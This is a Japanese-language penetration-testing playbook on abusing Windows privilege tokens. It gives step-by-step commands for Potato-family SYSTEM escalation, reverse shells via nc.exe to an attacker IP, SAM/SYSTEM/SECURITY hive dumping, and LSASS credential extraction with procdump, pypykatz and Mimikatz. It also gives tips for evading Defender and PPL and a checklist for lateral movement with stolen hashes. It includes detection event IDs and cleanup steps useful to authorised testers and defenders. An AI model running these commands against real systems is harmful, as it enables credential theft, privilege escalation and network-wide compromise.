# Windows 特権トークン悪用

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（LSASS アクセスは Defender for Endpoint / EDR が確実に検知。Token Impersonation は Event ID 4624 Type 3 / 4648 で記録）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

> 特権トークンの存在確認（`whoami /all` の Privileges 欄）→ `Enumeration_Checklist.md`（Step 1）

---

## SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege — Potato 系攻撃

### 着火条件

`whoami /all` の Privileges 欄に以下のいずれかが `Enabled` で出ている場合：
- `SeImpersonatePrivilege`
- `SeAssignPrimaryTokenPrivilege`

典型的に付与される実行コンテキスト：IIS アプリケーションプール（`iis apppool\[サイト名]`）、MSSQL サービスアカウント（`NT SERVICE\MSSQLSERVER` 等）、その他のサービスアカウント。

**攻撃者の思考トレース：** これらの特権は「サービスが別ユーザーに成りすます」ために Windows が正規に付与するもの。
悪用はすなわち「そのサービスアカウントが SYSTEM トークンを借用できる」という構造的問題。

### 環境前提

- 実行環境: ターゲット（Windows シェル内）
- 必要なツール: PrintSpoofer / GodPotato / RoguePotato（いずれも GitHub で公開中、別途転送要）
- オフライン代替: ツール自体をバイナリとして事前にコンパイルしてから転送する

---

### 環境判定フロー（何を試すか）

| シグナル | 試すツール |
|---------|----------|
| OS が Windows Server 2019 / 2022 または Windows 10/11（64bit） | **GodPotato** を最初に試す |
| OS が Windows Server 2016 以前 / Print Spooler サービスが `Running` | **PrintSpoofer** を最初に試す |
| Print Spooler が `Stopped` かつ比較的古い OS（2016 以前） | **RoguePotato** を試す |
| PrintSpoofer・GodPotato がいずれも失敗し `Named Pipe` エラー | RoguePotato（DCOM リバース接続型）に切り替え |

**Print Spooler の状態確認：**

```powershell
# [Target] Print Spooler の状態を確認
sc query spooler
# STATE: 4 RUNNING → PrintSpoofer が使える可能性が高い
# STATE: 1 STOPPED → PrintSpoofer は使えない
```

---

### 手順 — GodPotato（推奨：新しいOSで最も安定）

> **GodPotato とは：** .NET CLR の COM オブジェクト活性化を悪用して SYSTEM トークンを取得する Potato 系ツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。Windows Server 2012 以降の全バージョンで動作報告あり。

**事前準備（必須）：** テスター端末で HTTP サーバーを起動してバイナリを配信しておく。

```bash
# [Attacker] HTTP サーバーでバイナリを配信
python3 -m http.server 8888
# テスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等）の IP を確認: ip a
```

```powershell
# [Target] バイナリをダウンロード
iwr "http://[ATTACKER_IP]:8888/GodPotato.exe" -OutFile "C:\Windows\Temp\GodPotato.exe"

# [Target] コマンド実行（whoami 確認）
C:\Windows\Temp\GodPotato.exe -cmd "cmd /c whoami"
# nt authority\system が出ることを確認

# [Target] リバースシェル取得
C:\Windows\Temp\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe [ATTACKER_IP] [ATTACKER_PORT] -e cmd"
```

**事前準備（必須）：** リバースシェルを受け取る場合は、テスター端末でリスナーを起動しておく。

```bash
# [Attacker] リスナー起動
nc -lvnp [ATTACKER_PORT]
```

---

### 手順 — PrintSpoofer（Print Spooler が Running の環境向け）

> **PrintSpoofer とは：** Print Spooler サービスの名前付きパイプを利用して SYSTEM トークンを取得するツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。Windows Server 2016 以前～2019 が主な対象。

```powershell
# [Target] バイナリをダウンロード
iwr "http://[ATTACKER_IP]:8888/PrintSpoofer64.exe" -OutFile "C:\Windows\Temp\PrintSpoofer64.exe"

# [Target] コマンド実行
C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd
# 対話シェルが起動し whoami で nt authority\system が出ることを確認

# 対話シェルが不要な場合（コマンド直接実行）
C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe [ATTACKER_IP] [ATTACKER_PORT] -e cmd"
```

---

### 手順 — RoguePotato（フォールバック用）

> **RoguePotato とは：** DCOM リモートアクティベーションと偽 OXID リゾルバを組み合わせて SYSTEM トークンを取得するツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。PrintSpoofer・GodPotato が使えない環境の代替。

**事前準備（必須）：** テスター端末で socat（または nc）を使って 135/tcp をリダイレクトするリスナーを起動する。テスター側のポート 135 を別ポートに転送する処理が必要。

```bash
# [Attacker] 偽 OXID リゾルバ用ポートリダイレクト（socat）
socat TCP-LISTEN:135,fork,reuseaddr TCP:127.0.0.1:[ROGUE_PORT] &
# [ROGUE_PORT] は RoguePotato の -r オプションに合わせる（例: 9999）
```

```powershell
# [Target] RoguePotato を実行
C:\Windows\Temp\RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\Temp\nc.exe [ATTACKER_IP] [ATTACKER_PORT] -e cmd" -l [ROGUE_PORT]
```

---

### 刺さらなかったとき（SeImpersonate 系）

| 現象 | 原因 | 代替 |
|------|------|------|
| `Named pipe connection error` | 対応するサービス（Spooler等）が停止中 | GodPotato に切り替える |
| GodPotato で `Error: COM error` / `-2147221008` | .NET ランタイムのバージョン不一致 | RoguePotato に切り替える |
| すべての Potato 系が失敗 | Defender が EXE をブロック | AMSI バイパスを検討（Phase 6 の対象）またはメモリ上のみで実行 |
| `SeImpersonate: Disabled` と表示される | トークン調整権限が剥奪済み | SeBackup/SeRestore/SeDebug を確認する |

---

## SeBackupPrivilege / SeRestorePrivilege — SAM / SYSTEM ダンプ

### 着火条件

`whoami /all` に `SeBackupPrivilege` または `SeRestorePrivilege` が `Enabled` で出ている場合。

典型的な付与コンテキスト：Backup Operators グループメンバー、バックアップエージェントのサービスアカウント。

**攻撃者の思考トレース：** SeBackupPrivilege は「ファイルシステムの DACL を無視して読み取れる」権限。SAM（ローカルアカウントのハッシュ）・SYSTEM（ブートキー）・SECURITY（LSA シークレット・キャッシュドクレデンシャル）の 3 ハイブをレジストリ経由でバックアップし、テスター端末でオフライン解析する。

### 環境前提

- 実行環境: ターゲット（Windows シェル内）でハイブ取得 → テスター端末でハッシュ解析
- 必要なツール: `reg save`（Windows 標準）、`impacket-secretsdump`（ペネトレ用 Linux ディストリ標準搭載）
- オフライン代替: `impacket-secretsdump` の代わりに `samdump2`（要インストール）を使う

### 手順

**事前準備（必須）：** 書き込み可能な一時ディレクトリを確認する（`C:\Windows\Temp` 推奨）。

```powershell
# [Target] レジストリハイブをファイルに保存（SeBackupPrivilege で DACL を無視して読み取る）
reg save HKLM\SAM     C:\Windows\Temp\sam.hive     /y
reg save HKLM\SYSTEM  C:\Windows\Temp\system.hive  /y
reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y
```

```powershell
# [Target] ファイルをテスター端末にダウンロード（evil-winrm の場合）
download C:\Windows\Temp\sam.hive
download C:\Windows\Temp\system.hive
download C:\Windows\Temp\security.hive
```

```bash
# [Attacker] ハッシュを解析
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

**出力の読み方（例）：**

```
[*] Target system bootKey: 0x[BOOTKEY]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
[USER]:1001:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
[*] Dumping cached domain logon information (domain/username:hash)
[DOMAIN]/[DOMAIN_USER]:$DCC2$10240#[DOMAIN_USER]#[MSCACHE_HASH]
[*] Dumping LSA Secrets
[VARIOUS_LSA_SECRETS]
```

- NTLM ハッシュ（4番目フィールド）→ Pass-The-Hash に使用
- `$DCC2$` エントリ → キャッシュドドメインクレデンシャル（オフラインログイン用ハッシュ、hashcat `-m 2100` でクラック可能だが時間がかかる）
- LSA Secrets → サービスアカウントのパスワード・マシンアカウントハッシュ

**SeRestorePrivilege の追加悪用：**

```powershell
# [Target] 任意ファイルを DACL 無視で上書き（権限が必要なパスへの書き込み）
# 例：バックアップした SAM を改ざんして戻す（通常は SeBackup との併用で SAM dump のみ）
# より高度な悪用: DLL ハイジャック対象パスへの書き込みにも使える
```

### 刺さらなかったとき（SeBackup）

| 現象 | 原因 | 代替 |
|------|------|------|
| `reg save` が `Access Denied` | SeBackupPrivilege が Disabled の状態 | PowerShell で `Enable-Privilege SeBackupPrivilege` を試みる（要 PS スクリプト）|
| ハイブ取得はできるが `impacket-secretsdump` が解析できない | ハイブが破損 / 不完全なダウンロード | SYSTEM ハイブを再取得してから再試行 |
| キャッシュドクレデンシャル（`$DCC2$`）が空 | ドメインユーザーがこのホストに一度もログインしていない | 別のホストの SECURITY ハイブを狙う |

---

## SeDebugPrivilege — LSASS ダンプ

> **[HIGH IMPACT]** 本手法は LSASS プロセスへの直接アクセスを行うため、EDR/Defender for Endpoint で確実に検知される。本番では最高優先度の合意事項。

### 着火条件

`whoami /all` に `SeDebugPrivilege` が `Enabled` で出ている場合（Local Administrators グループメンバーに付与されていることが多い）。

**攻撃者の思考トレース：** SeDebugPrivilege は「任意プロセスのメモリに読み書きする」権限。LSASS（Local Security Authority Subsystem Service）はアクティブなユーザーセッションの認証情報（NT ハッシュ・Kerberos チケット・場合によっては平文パスワード）をメモリ上に保持しているため、これを読み取ることで認証情報を取得できる。

### 環境前提

- 実行環境: ターゲット（Windows シェル内）でダンプ取得 → テスター端末または対話型 Mimikatz で解析
- 必要なツール（選択肢）：
  - `Task Manager`（GUI アクセス可能な場合のみ）
  - `procdump.exe`（Sysinternals、別途転送要）
  - `pypykatz`（ペネトレ用 Linux ディストリ標準搭載、テスター端末側で解析）
  - `Mimikatz`（別途転送要、Windows シェル上で直接解析）

### 手順 A — procdump でダンプしてテスター端末で解析（ステルス性高）

```powershell
# [Target] procdump でダンプ
C:\Windows\Temp\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

```powershell
# [Target] ダウンロード（evil-winrm の場合）
download C:\Windows\Temp\lsass.dmp
```

```bash
# [Attacker] pypykatz で解析
pypykatz lsa minidump lsass.dmp
```

**pypykatz 出力の読み方（抜粋）：**

```
== MSV ==
Username: [USER]
Domain: [DOMAIN]
NT: [NTLM_HASH]
== WDIGEST ==
username [USER]
domainname [DOMAIN]
password None      # Windows 8.1/2012R2 以降 + KB2871997 適用後は None になる
== Kerberos ==
Username: [USER]
Password: None
== DPAPI ==
MasterKey: [DPAPI_MASTERKEY]    # → DPAPI_Browser_Creds.md で利用可能
```

- `NT:` フィールド → Pass-The-Hash に使用する NTLM ハッシュ
- `DPAPI MasterKey:` → ブラウザ保存パスワード・DPAPI 暗号化資格情報の復号に使用（→ `DPAPI_Browser_Creds.md`）
- `password:` が空でない場合（古い OS・WDigest 有効環境）→ 平文パスワードが取得できる

### 手順 B — Mimikatz を直接実行（シグネチャ検知に注意）

> **Mimikatz とは：** Windows の認証情報をメモリから取得するツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。EDR/AV による検知率が高いため、難読化版または反射的ロードが必要な場合がある。

**事前準備（必須）：** Mimikatz.exe を転送しておく。Defender が有効な場合はブロックされる可能性が高い。

```powershell
# [Target] Mimikatz を実行
C:\Windows\Temp\mimikatz.exe

# Mimikatz プロンプト内
privilege::debug          # SeDebugPrivilege を有効化
sekurlsa::logonpasswords  # LSASS からすべての認証情報を取得

# DPAPI マスターキーの取得（→ DPAPI_Browser_Creds.md で利用）
sekurlsa::dpapi
```

### 刺さらなかったとき（SeDebug / LSASS ダンプ）

| 現象 | 原因 | 代替 |
|------|------|------|
| Defender がダンプファイルを削除 | リアルタイム保護が有効 | Exclusion パスへ移動（`C:\Windows\Temp` が検知される場合は `C:\Users\Public\` を試す）|
| procdump でダンプが作成されるが 0 バイト | PPL（Protected Process Light）が LSASS に設定されている | `--bypass-ppl` オプションまたは代替ダンプツール（runascs 経由等）|
| LSASS の NT ハッシュが取れるが平文パスワードが None | WDigest 無効（Windows 8.1/2012R2 以降のデフォルト） | NTLM ハッシュで Pass-The-Hash を試みる |
| SeDebugPrivilege が Disabled | ユーザーは持っているが有効化されていない | `privilege::debug` コマンドで有効化する（Mimikatz が行う）|

---

## SeTakeOwnershipPrivilege — SAM / SYSTEM バックアップ取得

### 着火条件

`whoami /all` に `SeTakeOwnershipPrivilege` が `Enabled` で出ている場合。

**攻撃者の思考トレース：** SeTakeOwnership は「ファイル/レジストリキーのオーナーシップを強制的に自分に変更できる」権限。DACL で読み取りを禁じられていても、オーナー変更 → DACL 変更 → 読み取り、という3ステップで保護ファイルにアクセスできる。SAM・SYSTEM ハイブのバックアップ取得に使う。

### 環境前提

- 実行環境: ターゲット（Windows シェル内）
- 必要なツール: `takeown`・`icacls`（Windows 標準搭載）、`impacket-secretsdump`（テスター端末で解析）

### 手順

```powershell
# [Target] SAM ハイブのオーナーを自分に変更
takeown /F C:\Windows\System32\config\SAM

# [Target] 自分に読み取り権限を付与
icacls C:\Windows\System32\config\SAM /grant [USER]:F

# [Target] ファイルをコピー（オーナーになったので直接コピー可）
copy C:\Windows\System32\config\SAM C:\Windows\Temp\sam.hive
copy C:\Windows\System32\config\SYSTEM C:\Windows\Temp\system.hive

# [Target] evil-winrm でダウンロード
download C:\Windows\Temp\sam.hive
download C:\Windows\Temp\system.hive
```

```bash
# [Attacker] ハッシュを解析
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

**注意点：** オーナー変更・DACL 変更は監査ログ（Event ID 4670・4674）に記録される。変更した DACL は原状回復が必要。

**原状回復：**

```powershell
# [Target] DACL を元に戻す（Administrator グループのみに限定）
icacls C:\Windows\System32\config\SAM /remove [USER]

# [Target] オーナーを SYSTEM に戻す
takeown /F C:\Windows\System32\config\SAM /A
# /A オプションで Administrators グループにオーナーシップを渡す
```

### 刺さらなかったとき（SeTakeOwnership）

| 現象 | 原因 | 代替 |
|------|------|------|
| `takeown` で `Access Denied` | SeTakeOwnership が Disabled | Mimikatz `privilege::debug` の後に試みる |
| SAM を copy できない（ファイルロック） | OS がハイブをロック中 | `reg save` コマンドを使う（SeBackupPrivilege がある場合と同じ手順）|

---

## 昇格成功後に確認すること（横展開観点）

特権トークン悪用で SYSTEM または管理者権限を得たら、以下を確認する（「権限取得 = ゴール」ではない）：

- **SAM / LSASS から取得した NTLM ハッシュ** → Pass-The-Hash で他ホストへの接続性確認
- **DPAPI マスターキー（pypykatz / Mimikatz `sekurlsa::dpapi`）** → ブラウザ保存パスワード・Credential Manager の復号（→ `DPAPI_Browser_Creds.md`）
- **LSASS の Kerberos チケット（pypykatz / Mimikatz `sekurlsa::tickets`）** → Pass-The-Ticket で他ホストへのアクセス
- **LSA Secrets（impacket-secretsdump）** → サービスアカウントのパスワード・AD マシンアカウントのシークレット
- **キャッシュドドメインクレデンシャル（`$DCC2$`）** → hashcat でクラックしてドメインパスワードを取得
- **LAPS `ms-Mcs-AdmPwd` 属性** → 他ホストのローカル管理者パスワード（DCSync 後なら読み取り権限を実質持つ）
- **BloodHound で取得した SYSTEM ホストからの次のエッジ** → ACE Abuse / Kerberos Attacks への接続を確認

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。LSASS ダンプはドメイン内すべての認証情報に波及する操作
- **想定されるSIEM/EDR検知**:
  - LSASS アクセス → Defender for Endpoint の「LSASS Memory Access」アラート（確実に検知）
  - procdump / Mimikatz の EXE 実行 → AV シグネチャ検知（Event ID 4688 プロセス作成）
  - `reg save` による SAM/SYSTEM バックアップ → Event ID 4663（オブジェクトアクセス）
  - `takeown` / `icacls` による DACL 変更 → Event ID 4670・4674
  - Token Impersonation → Event ID 4624 Type 3 / 4648
  - **Sysmon Event ID 10（ProcessAccess）**: procdump / Mimikatz が `lsass.exe` にアクセスする際に記録。GrantedAccess `0x1010`（読み取り専用）/ `0x1410`（読み取り＋クエリ）などが検知トリガー。Sysmon の `targetImage: lsass.exe` フィルタでほぼ確実に捕捉される
  - **Sysmon Event ID 1（Process Create）**: GodPotato / PrintSpoofer / RoguePotato の EXE 起動時に記録。OriginalFileName と CommandLine の組み合わせで検知ルールが作られる
  - **Sysmon Event ID 17/18（PipeEvent — Pipe Created / Pipe Connected）**: Potato 系攻撃が偽の名前付きパイプを作成・接続する際に記録。`PipeName` に `\pipe\spoolss` / `\pipe\efsrpc` 等の既知パターンが出る
  - **EDR アラート名（例）**: CrowdStrike「Potential Token Impersonation via Named Pipe」、SentinelOne「Suspicious Named Pipe Impersonation」、Defender for Endpoint「Suspicious process accessed LSASS memory」
- **業務影響リスク**: なし（読み取り操作のみ。ただし LSASS アクセスは OS 安定性に影響する可能性が低確率でありメモリ使用量増加の副作用がある）
- **原状回復必須項目**:
  - ✅ `C:\Windows\Temp\*.hive` / `*.dmp` の削除
  - ✅ `takeown` / `icacls` で変更した DACL の原状回復
  - ✅ 取得した NTLM ハッシュ・平文パスワードの暗号化保管 → 案件終了時破棄
  - ✅ 転送したツールバイナリ（GodPotato / PrintSpoofer / procdump 等）の削除
- **取得情報の取扱**: NTLM ハッシュ・平文パスワードは暗号化保管、案件終了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：`whoami /all` で特権トークンを確認 → `./Enumeration_Checklist.md`（Step 1）
- 前：IIS / MSSQL サービスアカウントとして初期シェル取得 → `../02_Initial_Access/MSSQL_Exploitation.md`
- 後：取得した NTLM ハッシュで Pass-The-Hash → `./Credential_Dumping.md`
- 後：DPAPI マスターキー → ブラウザ保存パスワード復号 → `./DPAPI_Browser_Creds.md`
- 後：LSASS の Kerberos チケット → `Kerberos_Attacks/Pass_The_Ticket.md`
- 後：取得したハッシュのクラック → `../05_Tools_Reference/Hashcat.md`
